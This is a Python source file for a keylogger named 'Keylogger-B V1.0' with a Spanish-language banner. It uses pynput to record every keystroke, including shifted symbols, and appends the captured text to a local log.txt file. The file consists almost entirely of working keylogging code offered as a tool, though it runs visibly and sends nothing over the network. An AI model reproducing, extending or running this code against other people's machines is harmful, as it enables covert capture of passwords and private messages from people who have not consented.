from threading import Thread
from pynput.keyboard import Key, Listener
from colorama import init, Fore
import os
from tqdm import tqdm

os.system("clear")
print("\n")
loop = tqdm(total=10000, position=0, leave=False)
for k in range(10000):
    loop.set_description(Fore.LIGHTRED_EX + 'Opening Script'.format(k))
    loop.update(1)
loop.close()

print(f'''
{Fore.LIGHTMAGENTA_EX}   __ __         __                           ___ 
{Fore.LIGHTBLUE_EX}  / //_/__ __ __/ /__  ___ ____ ____ ________/ _ )
{Fore.LIGHTCYAN_EX} / ,< / -_) // / / _ \/ _ `/ _ `/ -_) __/___/ _  |
{Fore.LIGHTRED_EX}/_/|_|\__/\_, /_/\___/\_, /\_, /\__/_/     /____/ 
   V1.0  /___/       /___//___/  Autor: Balta     
                        {Fore.RESET} ________________________  
{Fore.LIGHTBLACK_EX}▐▓█▀▀▀▀▀▀▀▀▀█▓▌  {Fore.RESET}| Para ver todo lo       |
{Fore.LIGHTBLACK_EX}▐▓█   {Fore.RESET}▀   ▀▄{Fore.LIGHTBLACK_EX}   █▓▌  {Fore.RESET}| que escribió Consultar | 
{Fore.LIGHTBLACK_EX}▐▓█   {Fore.RESET}▄   ▄▀{Fore.LIGHTBLACK_EX}   █▓▌  {Fore.RESET}| el archivo log.txt     | 
{Fore.LIGHTBLACK_EX}▐▓█▄▄▄▄▄▄▄▄▄█▓▌  {Fore.RESET}|________________________| 
{Fore.LIGHTBLACK_EX}      ▄▄███▄▄            ''')
print(Fore.LIGHTBLUE_EX + "         h", end="")
print(Fore.LIGHTBLACK_EX + "t", end="")
print(Fore.LIGHTCYAN_EX + "t", end="")
print(Fore.LIGHTRED_EX + "p", end="")
print(Fore.LIGHTYELLOW_EX + "s", end="")
print(Fore.LIGHTGREEN_EX + ":", end="")
print(Fore.LIGHTWHITE_EX + "/", end="")
print(Fore.LIGHTBLUE_EX + "/", end="")
print(Fore.LIGHTBLACK_EX + "g", end="")
print(Fore.LIGHTCYAN_EX + "i", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "h", end="")
print(Fore.LIGHTBLACK_EX + "u", end="")
print(Fore.LIGHTCYAN_EX + "b", end="")
print(Fore.LIGHTRED_EX + ".", end="")
print(Fore.LIGHTYELLOW_EX + "c", end="")
print(Fore.LIGHTGREEN_EX + "o", end="")
print(Fore.LIGHTBLACK_EX + "m", end="")
print(Fore.LIGHTWHITE_EX + "/", end="")
print(Fore.LIGHTBLUE_EX + "B", end="")
print(Fore.LIGHTBLACK_EX + "a", end="")
print(Fore.LIGHTCYAN_EX + "l", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "a", end="")
print(Fore.LIGHTBLUE_EX + "-", end="")
print(Fore.LIGHTBLACK_EX + "P", end="")
print(Fore.LIGHTCYAN_EX + "y", end="")
print(Fore.LIGHTRED_EX + "t", end="")
print(Fore.LIGHTYELLOW_EX + "h", end="")
print(Fore.LIGHTGREEN_EX + "o", end="")
print(Fore.LIGHTWHITE_EX + "n\n")
print(Fore.RESET + ">>>", end="")

print(Fore.LIGHTRED_EX + " Enter para guardar y mostrar: ")

class Keylogger(object):

    def __init__(self, file):
        self.data = []
        self.file = file
        self.logged = ''
        self.lastkey = None
        self.listener = None
        self.is_alive = True
        self.num_to_symbol = {
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'
        }

        self.sym_to_symbol = {
            '`': '~', ',': '<', '.': '>', '/': '?', '\'': '\"', '\\': '|',
            ';': ':', '[': '{', ']': '}', '-': '_', '=': '+'
        }

    def _start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()

    def start(self):
        Thread(target=self._start, daemon=True).start()

    def stop(self):
        self.listener.stop()
        self.is_alive = False

    def on_release(self, key):
        if any([key == Key.shift, key == Key.shift_r]):
            self.lastkey = None

    def on_press(self, key):
        if key == Key.backspace:
            if len(self.data):
                del self.data[-1]

        elif key == Key.tab:
            self.data.append('\t')

        elif key == Key.enter:
            self.data.append('\n')
            self.flush()

        elif key == Key.space:
            self.data.append(' ')

        elif len(str(key)) == 3:
            self.check_for_shift(key)

        else:
            self.lastkey = key

    def check_for_shift(self, key):
        key = key.char
        if any([self.lastkey == Key.shift, self.lastkey == Key.shift_r]):
            key = (key.upper() if key.isalpha() else self.num_to_symbol[key] if
            key.isdigit() else self.sym_to_symbol[key] if key in self.sym_to_symbol else key)

        self.data.append(key)

    def flush(self):
        if not self.is_empty():
            self.logged = ''.join(self.data)
            print(self.logged)
            self.write()
        self.data = []

    def is_empty(self):
        is_empty = True
        for data in self.data:
            if data.strip():
                is_empty = False
                break
        return is_empty

    def write(self):
        with open(self.file, 'at') as f:
            f.write(self.logged)


if __name__ == '__main__':
    keylogger = Keylogger('log.txt')
    keylogger.start()

    try:
        while keylogger.is_alive: pass
    except KeyboardInterrupt:
        keylogger.stop()